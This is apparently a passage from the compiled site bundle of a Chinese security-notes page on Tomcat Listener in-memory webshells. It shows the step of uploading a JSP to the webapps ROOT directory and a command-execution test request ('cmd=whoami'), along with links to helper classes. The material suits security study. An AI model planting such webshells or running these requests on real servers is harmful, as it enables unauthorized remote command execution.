</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上传到 tomcat webapps 目录下, 比如上传到 ROOT 目录里:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410101135319.png" alt="image-20241010113512205"></p><p>直接测试命令执行: <code>/dynamicAddListenerBase64Class.jsp?cmd=whoami</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410101136899.png" alt="image-20241010113622848"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410101137391.png" alt="image-20241010113715324"></p><hr>`,14);function G(R,Y){const s=A("ExternalLinkIcon");return c(),i("div",null,[o,e("blockquote",null,[e("p",null,[e("a",r,[n("JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)"),a(s)])])]),d,e("blockquote",null,[e("p",null,[n("除了这个 Listener，其他的 Listener 在某些情况下也可以触发作为内存马的实现，"),e("a",u,[n("原文"),a(s)]),n("里没有对每个都进行触发测试，感兴趣的师傅可以自测。")]),m,v]),h,e("ul",null,[e("li",null,[g,B,e("ul",null,[e("li",null,[b,e("ul",null,[e("li",null,[k,e("ul",null,[E,C,e("li",null,[e("a",w,[n("SummerBasicListener.java"),a(s)])]),e("li",null,[e("a",y,[n("DynamicUtils.java"),a(s)])]),e("li",null,[e("a",Q,[n("AddTomcatListener.java"),a(s)])]),e("li",null,[e("a",Z,[n("SummerCMDListener"),a(s)])])])]),L])]),N])]),S]),F,e("p",null,[e("a",D,[n("JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)"),a(s)]),n(" 作者后记:")]),x])}const V=l(p,[["render",G],["__file","index.html.vue"]]),X=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Listener%E5%86%85%E5%AD%98%E9%A9%AC/","title":"Tomcat Listener 内存马","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"Listener内存马基本知识","slug":"listener内存马基本知识","link":"#listener内存马基本知识","children":[]},{"level":2,"title":"Listener内存马示例","slug":"listener内存马示例","link":"#listener内存马示例","children":[{"level":3,"title":"示例效果","slug":"示例效果","link":"#示例效果","children":[]},{"level":3,"title":"整体思路","slug":"整体思路","link":"#整体思路","children":[]},{"level":3,"title":"示例构造","slug":"示例构造","link":"#示例构造","children":[]}]},{"level":2,"title":"其他用法思路","slug":"其他用法思路","link":"#其他用法思路","children":[]},{"level":2,"title":"JSP马","slug":"jsp马","link":"#jsp马","children":[]}],"git":{"createdTime":1728311001000,"updatedTime":1728558055000,"contributors":[{"name":"233","email":"ayusummer233@vip.qq.com","commits":2},{"name":"233PC","email":"ayusummer233@gmail.com","commits":1}]},"readingTime":{"minutes":6.91,"words":2073},"filePathRelative":"网络安全/Web安全/内存马/Java内存马/Tomcat内存马/Listener内存马/index.md","localizedDate":"2024年10月7日","excerpt":"\\n<blockquote>\\n<p><a href=\\"https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p>\\n</blockquote>\\n<hr>\\n<ul>\\n<li><a href=\\"#tomcat-listener-%E5%86%85%E5%AD%98%E9%A9%AC\\">Tomcat Listener 内存马</a>\\n<ul>\\n<li><a href=\\"#listener%E5%86%85%E5%AD%98%E9%A9%AC%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86\\">Listener内存马基本知识</a></li>\\n</ul>\\n</li>\\n</ul>"}');export{V as comp,X as data};
